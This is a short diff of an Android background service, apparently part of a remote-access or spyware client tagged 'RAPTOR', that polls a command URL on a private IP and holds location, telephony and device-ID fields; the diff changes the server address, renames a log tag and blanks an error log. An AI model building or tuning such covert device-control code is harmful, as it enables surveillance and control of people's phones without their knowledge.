@@ -68,7 +68,7 @@ import me.everything.providers.android.telephony.TelephonyProvider;
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
 
     public Context context;
-    private String SERVER_URI = "http://192.168.42.229/commands.php";
+    private String SERVER_URI = "http://192.168.42.162/commands.php";
     private Timer timerTaskScheduler = new Timer();
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
@@ -234,7 +234,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     }
 
     private void showAllData(String data) {
-        Log.e("RAPTOR-RESPONSESS", data.toString() + "");
+        Log.e("RAPTOR-LOG", data.toString() + "");
     }
 
     @Nullable
@@ -325,7 +325,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
                     @Override
                     public void onError(ANError anError) {
-                        showAllData("Error connect command code: " + anError.getErrorCode());
+
                     }
                 });
 
